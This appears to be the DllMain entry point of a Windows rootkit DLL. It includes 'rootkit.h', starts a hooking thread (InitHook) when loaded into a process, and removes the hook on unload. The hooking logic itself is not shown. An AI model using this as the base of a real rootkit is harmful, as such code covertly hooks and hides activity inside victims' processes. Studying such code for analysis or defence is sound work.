#include <Windows.h>

#include "rootkit.h"

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH :
			DisableThreadLibraryCalls(hModule);
			CreateThread(nullptr, 0, InitHook, nullptr, 0, nullptr);
			break;

		case DLL_PROCESS_DETACH :
			RemoveHookAndFreeLibrary(hModule);
			break;

		default:
			return FALSE;
	}

    return TRUE;
}
